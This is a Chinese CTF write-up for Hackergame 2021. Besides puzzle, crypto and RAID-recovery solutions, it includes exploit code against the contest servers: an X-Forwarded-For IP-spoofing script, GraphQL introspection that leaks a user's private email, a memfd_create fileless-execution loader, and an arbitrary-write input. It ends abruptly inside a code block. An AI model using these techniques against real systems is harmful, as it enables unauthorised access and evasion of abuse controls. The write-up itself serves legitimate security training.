# Writeup

记录自己在 Hackergame 2021 的做题思路，原文在个人 [github](https://github.com/hzqmwne/hackergame2021-writeups/blob/master/players/hzqmwne/README.md ) 上。  

（仰望第一名的mcfx大佬（开赛前几天火力全开不停做题却也只能眼看mcfx始终比自己高至少一半的分数））  
（发现所有需要写大量代码的题目自己都没做）  


## 签到
```
http://202.38.93.111:10000/?page=1634964427
```
找比赛期间的时间戳填到 `page=` 的参数里  


## 进制十六——参上
手动读图，十六进制转换  
```python
print(bytes.fromhex("666c61677b5930555f5348305531445f6b6e30775f4830575f74305f43306e763372745f4845585f746f5f546578547d").decode())
```


## 去吧！追寻自由的电波

怀疑人生第一弹：为什么这么多人做出来的题我不会？？  
题目提到“无线电”，搜到了[航空无线电26英文字母读法](https://www.bilibili.com/read/cv5983192 )和[北约音标字母](https://zh.wikipedia.org/wiki/%E5%8C%97%E7%BA%A6%E9%9F%B3%E6%A0%87%E5%AD%97%E6%AF%8D )，确认就是这个。  
题目提到“录音的速度有所改变”，尝试减速播放，大约减到0.3-0.4倍节奏比较合理，能勉强辨认出几个单词，但完全听不清。  

自此卡题  

走头无路中，后来装了vlc播放器，各种乱调，工具-效果及滤镜-音频效果-高级-调节音调，滑块拖到 -12.0 semitones，声音立刻变得极其清晰。之后就是听单词对照表格找字母。  
（非常不理解其他人是如何快速想到调节音调的）  


## 猫咪问答 Pro Max

怀疑人生第二弹：除了自己，排行榜上其他的人几乎都做出了这道题和上道题……  
按惯例，lug的网站 [https://lug.ustc.edu.cn/](https://lug.ustc.edu.cn/ )肯定是信息的重要来源。  
2. 五星社团：见[https://lug.ustc.edu.cn/wiki/intro/](https://lug.ustc.edu.cn/wiki/intro/ )，除了2021年未知，列出的至少有4次。但这么好的社团没道理2021年不是五星，更可能是信息未及时更新，但不重要，其他题确定后4个5分别试一下就好。  
3. 找lug的历史新闻，搜索“活动室”，找到[https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/](https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/ )，照片里有答案。  
4. Google搜索“SIGBOVIK 2021”，找到论文合集 [http://sigbovik.org/2021/proceedings.pdf](http://sigbovik.org/2021/proceedings.pdf )，在第216页 `The Newcomb-Benford Law, Applied to Binary Data: An Empirical and Theoretic Analysis`，略读一遍文章，数据集的个数即文末图片的个数。  
5. Google搜索 ietf 2021 Protocol Police 等关键词，找到 rfc8962 [https://datatracker.ietf.org/doc/html/rfc8962](https://datatracker.ietf.org/doc/html/rfc8962 )，答案在第6节。   

这4题都不难，但第1题着实搞人。  
百度、Google、……各种搜索、变换关键词查找“中科大”“信息安全俱乐部”“章程”“社团章程”“社团代表大会”“SEC@USTC”“sec.ustc.edu.cn”等通通无解。  
找了lug的活动记录 [https://lug.ustc.edu.cn/wiki/lug/events/](https://lug.ustc.edu.cn/wiki/lug/events/ )，所有“大会”“活动”相关的日期都试了一遍，仍然不对。  
FTP [https://ftp.lug.ustc.edu.cn/%E7%A4%BE%E5%9B%A2%E7%AE%A1%E7%90%86/%E7%AB%A0%E7%A8%8B/](https://ftp.lug.ustc.edu.cn/%E7%A4%BE%E5%9B%A2%E7%AE%A1%E7%90%86/%E7%AB%A0%E7%A8%8B/ )找历史章程，试图获得蛛丝马迹，无果。  

卡了几天  

非常偶然，才想到网页归档，上archive.org查sec.ustc.edu.cn，才终于找到答案：[https://web.archive.org/web/20170515053637/http://sec.ustc.edu.cn/doku.php/codes](https://web.archive.org/web/20170515053637/http://sec.ustc.edu.cn/doku.php/codes )  


## 卖瓜

与其说是Web，实际更像Misc  
这题也卡了一些时间（看来自己对Misc题确实缺乏感觉）  

后端是php，查到了php整数溢出的一些文档，感觉方向应该就是这个。  
一通乱试，发现放 10000000000000000000 个 9 斤瓜能得到 -9223372036854775808 （换算成十六进制是0x8000000000000000，即INT64_MIN），完全不能理解。  
然后放 1024819115206086200 个 9 斤瓜得到 -8。   
再放 1 个 9 斤瓜得到 1。

以上重复一遍得到 2，再放最后 2 个 9 斤瓜即可。


## 透明的文件

各种中括号、分号等，明显的终端转义序列的特征。  
批量把"\["替换为"\\033\["，然后cat，发现终端的某些地方变为了透明的。  

考虑先把终端填满字符，我的方法是 `export PS1="##################################################################"`，然后按回车填充全屏的 `#`，再cat文件即可。  
（个人觉得flag拼成的字符画，有的字符还是比较难辨认的……）  


## 旅行照片

蓝色的KFC比较少见，应该是解题的突破口。去网上搜索发现还是一个网红打卡地（秦皇岛新奥海底世界店）。  
找到的一些打卡照片 [https://www.xiaohongshu.com/discovery/item/5ec5065e000000000101eacc](https://www.xiaohongshu.com/discovery/item/5ec5065e000000000101eacc )  
去地图搜索该店铺，找到电话。  

旁边建筑的三个大字，百度街景地图并没有找到蓝色的KFC（赛后看题解，大多数人都是从街景地图看到的，why？？）；网红们的打卡照片又非常精致，KFC周边的建筑一点都没有上镜。  
最后找到了这段视频 [https://www.bilibili.com/video/av287639472/](https://www.bilibili.com/video/av287639472/ )，里面有一个镜头展示了旁边建筑。  

楼层直接数对面楼；面朝方向可结合地图里标出的方向以及海的方位；拍摄时间参照地面物体的影子。  


## FLAG 助力大红包

IP地址伪造，第一反应是 `X-Forwarded-For` 的http头，试了下发现可行。  
写脚本，因为没注意到接口返回提示每个/8网段只能助力一次，所以直接随机生成了32位ipv4地址，10分钟内的成功率很低，跑了很多轮脚本才成功一次。  
```python
import requests
import time
import random

seen = set()

for i in range(2560000):
    x = random.getrandbits(32)
    while x in seen:
        x = random.getrandbits(32)
    seen.add(x)
    '''
    a = random.randrange(0,256)
    b = random.randrange(0,256)
    c = random.randrange(0,256)
    d = random.randrange(0,256)
    '''
    a = (x>>24) & 0xff
    b = (x>>16) & 0xff
    c = (x>>8) & 0xff
    d = x & 0xff
    ip = f"{a}.{b}.{c}.{d}"
    data = {"ip": ip}
    headers = {"X-Forwarded-For": ip}
    address = "http://202.38.93.111:10888/invite/<>"    # address need to modify
    r = requests.post(address, data=data, headers=headers)
    print(ip, r.text)
    if ("操作速度太快了" in r.text):
        time.sleep(1)
    if ("重复的" in r.text):
        continue
    time.sleep(0.5)
```


## Amnesia

### 轻度失忆

字符串常量默认会放到.rodata段，非0全局变量默认会放到.data段。但是局部变量默认在栈上，不受影响。  
```c
#include <unistd.h>

int main(void) {
	char buf[] = "Hello, world!";
	write(1, buf, 13);
	return 0;
}
```
在优化级别不高且字符串不太长的情况下，上面对char []的初始化方式会生成把整数放入内存的指令，因此可行。  
（如果初始化字符串很长且优化级别很高，编译器会把初始化的常量字符串放入.rodata然后在代码中生成复制的指令）  

### 记忆清除

以下解法应该与编译器版本、架构、优化级别都无关。（即使.text, .data, .rodata三个段全部去除掉也可以）  
```c
__attribute__((section(".plt")))
static void preinit(void) {
	char buf[] = "Hello, world!";
	unsigned int ret;
	__asm__ __volatile__ ("int $0x80" : "=a"(ret) : "a"(4), "b"(1), "c"(buf), "d"(13) : "memory");
	__asm__ __volatile__ ("int $0x80" : "=a"(ret) : "a"(1), "b"(0) : "memory");
}

__attribute__((section(".preinit_array"))) void (*preinitarray[])(void) = { &preinit };

int main(void) {
	return 0;
}
```

ELF文件有section和segment，其中section由Section Header索引，segment由Program Header索引。  
编译器生成代码时，会按照默认的spec把源代码的不同部分放入不同的section中（例如代码放入.text，全局非0常量放到.data等），在代码中可以通过__attribute__((section("???")))手动重新指定。  
section和segment的关系：在编译期链接时，链接器ld会按照默认的ldscript（ld --verbose可查看）把某些section合并在一起作为一个segment。`readelf -l` 可以查看这个映射关系。  
Linux内核加载ELF文件时只看segment，忽略section，内核会为Program Header中标识为LOAD的segment按照指示的内存地址和权限建立内存映射。  

对于动态链接的程序，Program Header中有一个type为INTERP的segment，指定了动态链接器`ld.so`的路径。execve系统调用从内核返回之后，程序计数器pc会停留在`ld.so`的entrypoint上，而不是该elf程序本身的entrypoint上。  

之后的执行路径：
```
entrypoint (ld.so) -> PREINIT_ARRAY (elf) -> _start (elf) -> __libc_start_main (libc.so.6) -> INIT_ARRAY (elf) -> main (elf)
```
所以，在进入elf的入口点_start之前，ld.so会先调用.preinit_array节指定的函数，此时还未触及到elf文件的.text节。至于函数本身所在的section不一定是.text，只要最终能进入有执行权限的LOAD segment即可。  
main函数只是为了通过链接器的检查（因为不能修改链接脚本，所以无法覆盖crt1.o的默认_start函数）。  
为了减少未知的复杂性，.preinit_array函数没有调用任何库函数，而是直接用内联汇编调用write和exit系统调用。  

（.preinit_array是从某个国外比赛中见到的，从那之后印象一直很深刻）  
（刚开始没有仔细读题，赛后看writeup才发现题目只是把.text段抹零而不是直接删掉。个人认为题目最好应该是直接删掉.text段而不是仅仅抹零）  


## 图之上的信息

搜索 GraphQL 相关的资料，找到一篇文章 [https://blog.csdn.net/he_and/article/details/112389292](https://blog.csdn.net/he_and/article/details/112389292 )  
文章提到了 GraphQL内省机制：__schema，__type，照做就好  

```shell
curl 'http://202.38.93.111:15001/graphql' -H 'Cookie: <>' --data-raw '{"query":"{ __schema { types {name} } }"}'
curl 'http://202.38.93.111:15001/graphql' -H 'Cookie: <>' --data-raw '{"query":"{ __schema { types {name\nfields{name}} } }"}'
curl 'http://202.38.93.111:15001/graphql' -H 'Cookie: <>' --data-raw '{"query":"{ __schema { types {name\nfields{name\nargs{name}type{name}}} } }"}'
curl 'http://202.38.93.111:15001/graphql' -H 'Cookie: <>' --data-raw '{"query":"{ user(id: 1) { id\nusername\nprivateEmail }}"}'
```


## Easy RSA

get_p函数：注意到x是质数，y和x差值很小，想到威尔逊定理（如果p是质数，则 (p-1)!=-1(mod p)），可以优化掉y的阶乘  
get_q函数：通过sympy.prevprime不断找前一个质数恢复value数组  
恢复q和m是RSA常规运算  

代码：（Python 3.8 及以后版本的内建pow函数支持负指数模幂，无需第三方库）
```python
import sympy

e = 65537
c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478

x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451
y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439

p = x-1
for i in range(y+1, x):
    p = p*pow(i, -1, x) % x
p = sympy.nextprime(p)

value = [None]*10
value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967
for i in range(8, -1, -1):
    value[i] = sympy.prevprime(value[i+1])
value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819

phiq = 1
nq = 1
for i in range(10):
    phiq *= value[i]-1
    nq *= value[i]
q = pow(value_q, pow(e,-1,phiq), nq)
q = sympy.nextprime(q)

phi = (p-1)*(q-1)

d = pow(e, -1, phi)

m = pow(c, d, p*q)

print(hex(m))
print(m.to_bytes((m.bit_length()+7)//8, 'big'))
```


## 加密的 U 盘

LUKS通过主密钥(master key)加密磁盘数据，用户密码仅用来加密主密钥，修改密码默认不改变主密钥。（这也是几天后才反应过来的）  

按照常规步骤，挂载day1.img，提取master key，然后解密day2.img  

但是dmsetup提取master key时遇到了问题，只能获得一个UUID，没有key。（赛后看writeup，好像有的人没遇到这个问题）  
经过搜索找到 [https://gitlab.com/cryptsetup/cryptsetup/-/issues/453](https://gitlab.com/cryptsetup/cryptsetup/-/issues/453 )，原因与LUKS2和内核的keyring机制有关，按文章所述在cryptsetup时添加`--disable-keyring`即可。  

完整的步骤如下：
```shell
sudo losetup -P -f day1.img
sudo losetup -P -f day2.img

sudo cryptsetup --disable-keyring luksOpen /dev/loop0p1 myusb1    # 输入题目给的密码
sudo dmsetup table --showkeys myusb1    # 导出主密钥
echo <这里是上一步看到的主密钥> | xxd -r -p > master_key.bin

sudo cryptsetup --master-key-file=master_key.bin luksOpen /dev/loop1p1 myusb2    # 通过主密钥直接挂载day2.img
sudo mount /dev/mapper/myusb2 /mnt
cat /mnt/flag.txt

sudo cryptsetup luksClose myusb2
sudo losetup -d /dev/loop1
sudo cryptsetup luksClose myusb1
sudo losetup -d /dev/loop0
```


## 赛博厨房

阅读代码，发现每一天的菜谱是根据已保存的程序的sha256生成的。理论上，这是不可预测的。  

### Level 0
菜谱只有4种，很容易碰撞到恰好满足的：
```
向右 1 步
拿起 1 个物品
向下 1 步
向左 1 步
放下 1 个物品
向右 2 步
向上 1 步
拿起 1 个物品
向下 1 步
向左 2 步
放下 1 个物品
```

### Level 1
菜谱只有一种，程序有72行的长度限制，用循环：
```
向右 1 步
拿起 73 个物品
向下 1 步
向左 1 步
放下 1 个物品
如果手上的物品大于等于 1 向上跳转 1 行
```

### Level 2
想到了爆破的可能性，但是 32\*\*6/128 = 8388608 觉得太太不现实（没想到这竟然是预期）  

### Level 3
看到给了很多盘子想到了可能要利用编码，但没注意到前一天的放下的盘子在第二天不清空  


## 灯，等灯等灯

### Level 0
每个格子最终的数字可以表示为每个格子被按下次数的线性组合。  
构造一个线性方程组，然后在模256的意义下求解。  
不想手写高斯消元（本地也没有sage环境），用z3求解：
```python
from z3 import *
import requests

targetmap = [
    [189,189,189,189,189,33,33,33,189,189,189,189],
    [189,189,189,33,33,33,189,33,44,189,189,189],
    [189,189,189,189,189,33,33,33,33,189,189,189],
    [189,189,189,189,189,33,189,33,33,189,189,189],
    [189,189,189,33,33,189,189,33,33,33,189,189],
    [189,134,33,33,189,189,189,189,33,33,189,189],
    [189,144,33,33,189,189,189,189,33,189,189,189],
    [189,142,33,33,189,189,189,189,33,33,33,189],
    [189,100,142,33,189,189,189,189,33,33,33,189],
    [189,142,142,189,189,189,189,189,189,33,189,189],
    [189,59,142,33,189,189,189,189,33,189,189,189],
    [189,189,33,33,189,189,189,189,189,189,189,189]
]

disablemap = [
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
]

core = [
    [0,0,1,0,0],
    [0,0,2,0,0],
    [1,2,3,2,1],
    [0,0,2,0,0],
    [0,0,1,0,0]
]

targetscore = 0


def generate_matrix(core, disablemap):
    matrix = [[0]*144 for _ in range(144)]
    for i in range(12):
        for j in range(12):
            if disablemap[i][j]:
                continue
            for x in range(-2, 3):
                for y in range(-2, 3):
                    if (0 <= (i+x) < 12) and (0 <= (j+y) < 12):
                        matrix[12*(i+x)+(j+y)][12*i+j] += core[x+2][y+2]
    return matrix


matrix = generate_matrix(core, disablemap)

b = [BitVec(f"{i}_{j}",8) for i in range(12) for j in range(12)]

mulresult = [None]*144

for i in range(144):
    mulresult[i] = 0
    for j in range(144):
        mulresult[i] += matrix[i][j] * b[j]

s = Solver()

for i in range(12):
    for j in range(12):
        s.add(mulresult[12*i+j] == targetmap[i][j])
        
print(s.check())
m = s.model()

print(m)


answer = [[m[b[12*i+j]].as_long() for j in range(12)] for i in range(12)]
print(answer)

headers = {
    "Cookie" : "session=<>"
}
data = {
    "level":"0",
    "solution" : str(answer)
}
r = requests.post("http://202.38.93.111:12768/submit", data=data, headers=headers)
print(r.text)
```

### Level 1
这关z3解不动了  
矩阵乘法除了可以理解为模256空间线性方程组的近似解，还可以理解为寻找模256空间下的若干个向量最接近目标向量的线性组合。  
考虑到了格基规约，但不确定是否满足条件，再加上LLL实在用的不熟，就没去尝试。  

### Level 2
（同上）


## 只读文件系统
Linux上的无文件执行，经典的 `memfd_create` + `execveat` [here](https://github.com/hzqmwne/my-ctf-challenges/blob/master/0CTF_TCTF-2021-Finals/babalogin/src/babalogin.c )  
（题目给了远程内核版本也是一种提示）  

shellcode：（有C，有编译器，为什么还要手写汇编呢）
```c
#include "tinylib.h"

int main(void) {
	write(1, "expexp", 6);
	int fd = memfd_create("", 0);
	int total = 0;
	char buf[4096];
	while (total != 16744) {
		int r = read(0, buf, 4096);
		write(fd, buf, r);
		total += r;
	}
	execveat(fd, "", NULL, NULL, AT_EMPTY_PATH);
	return 0;
}
```
用 [https://github.com/hzqmwne/tinyelf](https://github.com/hzqmwne/tinyelf ) 编译成shellcode  

与服务器交互：
```python
from pwn import *

s = remote("202.38.93.111", 10106)

s.sendlineafter(b"Please input your token:", b"<>")

with open("shellcode.textbin", "rb") as f:
    payload1 = f.read()

with open("hello", "rb") as f:
    hello_binary = f.read()

s.sendafter(b"Starting challenge...", payload1)
s.sendafter(b"expexp", hello_binary)

s.interactive()
```

（手慢了几分钟没抢到一血）


## 一石二鸟
unsafe通常是去掉了边界检查，造成越界  
随便给参数，例如 `./runme 4294967295 101` ，触发了segmentation fault  

gdb调试，segmentation fault 发生在 ` 0x4094fc    mov    qword ptr [rbx + rcx*8 + 0x10], rax`，这里的偏移rcx就是输入转换为有符号64位整数值，完全可控，所以这是一个任意地址写入。  
一开始尝试修改vector内部表示长度的值，发现没有效果。对vector里的内存下硬件读断点，找到了 `0x4095E5`，这附近是计算vector中0的个数的代码循环，vector的长度100已经内联到代码中了。  

尝试修改vector内部指向缓冲区的指针。开启ASLR多次调试发现该指针（即0x4094c处的rbx）的值永远不变。  
注意0x409568，发现计算0的个数的循环处的0x4095eb的rax来自于rbp+0x10，这个值也是固定不变的，因此利用任意写把它改到一段包含较多的非0数的地方即可。  

本地 `./runme 126734 283468912456` 在Ubuntu 20.04、Ubuntu 18.04 都能成功，但远程都不行，怀疑远程是docker环境的原因，本地启docker验证确实如此。  
微调偏移量，发现 `./runme 126732 283468912456` 可以打通远程。  


## Micro World
发现是pyinstaller打包的可执行程序，用pyinstxtractor解包  
主程序是2.pyc，用decompyle3反编译（看题解很多人都用的是uncompyle6，但是这个工具的作者自己都建议Python 3.7以上改用decompyle3 [see here](https://github.com/rocky/python-uncompyle6 )）  
（以及，看到某些题解说反编译完的代码需要小修改才能跑，但本人没有遇到这个问题）  

题目实现了一个粒子系统，只要把初速度反向即可反向推演，大约反向28个循环即可大致看出flag的形状。  

粒子拼成的flag的形状极难辨认，经反复尝试才勉强搞出来，一度以为解法是不是非预期（然而赛后看到自己恢复出来的图和官方writeup的图完全一致……）  


## 卷王与野生的 GPA

IDA逆向elf文件，找到decrypt函数，提取数据手动跑一遍。  
不想手动解析屏幕输出缓冲区的数据格式，于是在gba文件里找到所有预存的画面并覆盖掉（有的覆盖后会出错，跳过即可），用模拟器打开即可看到flag。  

```python
with open("catchGPA.elf", "rb") as f:
    allcontent = f.read()

def p16(n):
    n &= 0xffff
    return n.to_bytes(2, "little")

def u16(s):
    assert len(s) == 2
    return int.from_bytes(s, "little")

key_raw = allcontent[0x16214:0x16214+11520*2]
flagenc_raw = allcontent[0x10814:0x10814+11520*2]

# 11520 = 144*80

flagdec = [None]*11520

for i in range(11520):
    index = u16(key_raw[i*2:i*2+2])
    flagdec[i] = u16(flagenc_raw[index*2:index*2+2])

flagdec_raw = b"".join(map(p16, flagdec))

with open("catchGPA.gba", "rb") as f:
    allcontent2 = f.read()

with open("catchGPA_patched.gba", "wb") as f:
    f.write(allcontent2)
    last = -1
    while True:
        last = allcontent2.find(b"\x28\x25\xe6\x1c", last+1)
        print(last)
        if last == -1 or index > 100000000000:
            break
        f.seek(last)
        f.write(flagdec_raw)
```


## 阵列恢复大师

### 1 - RAID 0

先过了 RAID 5 再看的 RAID 0，但个人觉得手动做还是 RAID 0 更简单（用工具的话可能 RAID 5 比 RAID 0 好做一点）  

同样先找连续的文本：
```
wlOUASom2fI.img [0x8c0000, 0x8e0000)
jCC60mutgoE.img [0x8c0000, 0x8e0000)
```
```
1GHGGrmaMM0.img [0x8c0000, 0x8e0000)
5qiSQnlrA4Y.img [0x8c0000, 0x8e0000)
d3Be7V0EVKo.img [0x8c0000, 0x8e0000)
```
```
eRL2MQSdOjo.img [0x8c0000, 0x8e0000)
RApjvIxRlu0.img [0x8c0000, 0x8e0000)
```
```
ID7sM2RWkyI.img [0x8c0000, 0x8e0000)
```
可以分成如上的四组，确定条带大小为128KB(0x20000)。  
通过GPT分区表和备份分区表，确定 wlOUASom2fI.img 是第一块盘，ID7sM2RWkyI.img 是最后一块盘。  
中间第二组和第三组的顺序不确定，两种情况都试一下即可。  

最后写程序合并为一块磁盘：
```python
def recover_raid0(disklist, blocksize):
    total_size = 0
    for d in disklist:
        assert len(d) % blocksize == 0
        total_size += len(d)
    raidnum = len(disklist)
    assert total_size == len(disklist[0])*raidnum
    blockcount = total_size // blocksize
    r = bytearray(blockcount*blocksize)
    for i in range(blockcount):
        d = disklist[i % raidnum]
        block = d[(i//raidnum)*blocksize:(i//raidnum+1)*blocksize]
        assert len(block) == blocksize
        r[i*blocksize:(i+1)*blocksize] = block
    return r

filelist = [
    "wlOUASom2fI.img",
    "jCC60mutgoE.img",
    "1GHGGrmaMM0.img",
    "5qiSQnlrA4Y.img",
    "d3Be7V0EVKo.img",
    "eRL2MQSdOjo.img",
    "RApjvIxRlu0.img",
    "ID7sM2RWkyI.img",        
]

disklist = []
for s in filelist:
    with open(s, "rb") as f:
        disklist.append(f.read())

r = recover_raid0(disklist, 128*1024)

with open("result.img", "wb") as f:
    f.write(r)
```

### 2 - RAID 5

看到 RAID 5 过的人多就先看了这个。  

RAID5布局方式介绍及对性能的影响  
[https://zohead.com/archives/raid5-layout-performance](https://zohead.com/archives/raid5-layout-performance )  
```
左对称：
  0  1  2  3  P
  5  6  7  P  4
 10 11  P  8  9
 15  P 12 13 14
  P 16 17 18 19
左不对称：
  0  1  2  3  P
  4  5  6  P  7
  8  9  P 10 11
 12  P 13 14 15
  P 16 17 18 19
右对称
  P  0  1  2  3
  7  P  4  5  6
 10 11  P  8  9
 13 14 15  P 12
 16 17 18 19  P
右不对称
  P  0  1  2  3
  4  P  5  6  7
  8  9  P 10 11
 12 13 14  P 15
 16 17 18 19  P
```

先找连续的块（走了不少弯路才想到最先做的应该是这个），从文本文件入手，连续的块排布如下：  
```
3RlmViivyG8.img [0x2b0000, 0x2c0000)

IrYp6co7Gos.img [0x2c0000, 0x2d0000)
3D8qN9DH91Q.img [0x2c0000, 0x2d0000)
QjTgmgmwXAM.img [0x2c0000, 0x2d0000)
60kE0MQisyY.img [0x2c0000, 0x2d0000)

3RlmViivyG8.img [0x2d0000, 0x2e0000)
IrYp6co7Gos.img [0x2d0000, 0x2e0000)
3D8qN9DH91Q.img [0x2d0000, 0x2e0000)
QjTgmgmwXAM.img [0x2d0000, 0x2e0000)

60kE0MQisyY.img [0x2e0000, 0x2f0000)
3RlmViivyG8.img [0x2e0000, 0x2f0000)
```
以上可带来的信息有：  
- 条带大小为64KB(0x10000)  
- 连续的数据块所在的盘的序号也是连续的（确定模式是 左对称 或 右不对称）  
- 当前条带的校验块和上一条带的最后一个数据块位于同一块磁盘上（确定模式是 左对称）  
盘的顺序是 3RlmViivyG8.img, IrYp6co7Gos.img, 3D8qN9DH91Q.img, QjTgmgmwXAM.img, 60kE0MQisyY.img，哪块是第一块暂时未知

GPT分区数据格式分析  
[http://www.360doc.com/content/18/0526/10/51888465_757122283.shtml](http://www.360doc.com/content/18/0526/10/51888465_757122283.shtml )  

对照本地的磁盘，根据GPT分区表和备份分区表的未知，确定原始分区表位于 3RlmViivyG8.img 或 60kE0MQisyY.img 开头，备份分区表位于 3D8qN9DH91Q.img 或 QjTgmgmwXAM.img 结尾。  
结合盘的顺序，确定真正的第一块盘是 3RlmViivyG8.img

写脚本合并为一块磁盘：
```
from pprint import pprint

def raid_map(raidnum, left=1, symmetric=1):
    rawmap = [[None for j in range(raidnum)] for i in range(raidnum)]
    reverse_rawmap = [None] * (raidnum * (raidnum-1))
    index = 0
    for i in range(raidnum):
        p_pos = raidnum-1-i if left else i
        j = p_pos if symmetric else 0
        for _ in range(raidnum):
            if j != p_pos:
                rawmap[i][j] = index
                reverse_rawmap[index] = (i, j)
                index += 1
            j = (j+1) % raidnum
    return rawmap, reverse_rawmap

def recover_raid5(disklist, blocksize, raid_reverse_rawmap):
    total_len = 0
    for d in disklist:
        assert len(d) % blocksize == 0
        total_len += len(d)
    raidnum = len(disklist)
    assert raidnum*(raidnum-1) == len(raid_reverse_rawmap)
    assert total_len == len(disklist[0])*raidnum
    blockcount = total_len*(raidnum-1) // (blocksize*raidnum)

    r = bytearray(total_len)
    for blocknum in range(blockcount):
        _, disknum = raid_reverse_rawmap[blocknum%(raidnum*(raidnum-1))]
        diskblocknum = blocknum//(raidnum-1)
        print(hex(blocknum*blocksize), blocknum%(raidnum*(raidnum-1)), disknum, hex(diskblocknum*blocksize))
        block = disklist[disknum][diskblocknum*blocksize:(diskblocknum+1)*blocksize]
        if len(block) != blocksize:
            print(len(block))
        assert len(block) == blocksize
        r[blocknum*blocksize:(blocknum+1)*blocksize] = block
    return r

diskfiles = [
    "3RlmViivyG8.img",
    "IrYp6co7Gos.img",
    "3D8qN9DH91Q.img",
    "QjTgmgmwXAM.img",
    "60kE0MQisyY.img",
]

disklist = []
for filename in diskfiles:
    with open(filename, "rb") as f:
        disklist.append(f.read())

_, left_symmetric = raid_map(5, 1, 1)

r = recover_raid5(disklist, 64*1024, left_symmetric)

with open("result.img", "wb") as f:
    f.write(r)
```


## 链上预言家
没看


## 助记词

### 第一顿大餐

触发Phrase.equals时会引入20ms的延时。在不断插入到LinkedHashSet时，根据内部实现，先计算key的hash，如果hash重复再调用key的equals方法比较。  
第一关要求600ms的延时，阅读后端代码发现一次请求可以发送32个助记词（前端只允许1个）。发送32个相同的，正好可以触发31次插入和equals比较。  

```shell
curl 'http://202.38.93.111:10048/phrases?token=<>' --data-raw '["young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth"]'
```

### 第二顿大餐
第二关要求9000ms延时，Java的HashMap用的是链表解决hash冲突，如果插入的32个key都位于一条链上，那么总的延时是20\*(1+2+..+31) ≈ 20\*16\*32 = 10240，刚好够。  
翻JDK源码找Object.hashCode的实现，只找到了String的似乎在 [这里](https://github.com/openjdk/jdk17/blob/master/src/hotspot/share/classfile/javaClasses.hpp#L211 )  
然后应该是枚举助记词，计算延时，找hash碰撞。代码感觉不大好写，没做。  


## Co-Program

### Co-Login

奇怪的除法和取模运算规则，查了下是 “Hardware Interpretation of Division by zero”，z3-solver 里对应 hi_div0 选项，BitVec是默认启用的。

注意下BitVec默认重载的 '/' 和 '%' 运算是有符号数，其对应的无符号运算是 UDiv 和 URem 函数。  

得益于Python的动态特性，无需修改z3的源码或者搞继承重载，只需要一个简单的monkey patch（见下面代码的第4和5行）
（做这个patch之前100个只能成功50-60个，patch之后能成功90多个）

```
from pwn import *
from z3 import *

BitVecRef.__div__ = lambda self, other : UDiv(self, other)
BitVecRef.__mod__ = lambda self, other : URem(self, other)

def solve(express, ans):
    x = BitVec("x", 36)
    y = BitVec("y", 36)
    z = BitVec("z", 36)
    i = BitVec("i", 36)
    j = BitVec("j", 36)
    k = BitVec("k", 36)

    s = Solver()
    s.add(eval(express, globals(), locals()) == ans)
    
    if s.check() == sat:
        m = s.model()
        print(m)
        r = []
        if "x" in express:
            tmp = m[x]
            r.append(f"x={1 if tmp is None else tmp.as_long()}")
        if "y" in express:
            tmp = m[y]
            r.append(f"y={1 if tmp is None else tmp.as_long()}")
        if "z" in express:
            tmp = m[z]
            r.append(f"z={1 if tmp is None else tmp.as_long()}")
        if "i" in express:
            tmp = m[i]
            r.append(f"i={1 if tmp is None else tmp.as_long()}")
        if "j" in express:
            tmp = m[j]
            r.append(f"j={1 if tmp is None else tmp.as_long()}")
        if "k" in express:
            tmp = m[k]
            r.append(f"k={1 if tmp is None else tmp.as_long()}")
        return " ".join(r)

    return ""


s = remote("202.38.93.111", 10700)

s.sendlineafter(b"Please input your token:", b"<>")
s.recvuntil(b"Welcome to Macrohard 36-bit computer!\n")

for i in range(100):
    express = s.recvline().decode().strip()
    ans = int(s.recvline().decode().strip())
    print(i, express, ans)
    r = solve(express, ans)
    print(r, len(r))
    s.sendline(r.encode())

s.interactive()
```

### Co-UnitTest

允许if，就可以很暴力，判断输入等于哪个数然后直接给答案：
```
if (x == x[0]):
    return ans[0]
else:
    if (x == x[1]):
		return ans[1]
	else:
		...
```

所以，只需要构造出常数即可。  
借鉴了去年 [超精巧的数字论证器](https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E8%B6%85%E7%B2%BE%E5%B7%A7%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%BA%E8%AF%81%E5%99%A8/README.md )
的构造方法，把整数拆分为形如`(((((((0+a)*10+b)*10+c)*10+d)*10)+e)*10)+f`的十进制格式。  
`x/x`为1，1生万物，构造结束。  

```python
from pwn import *
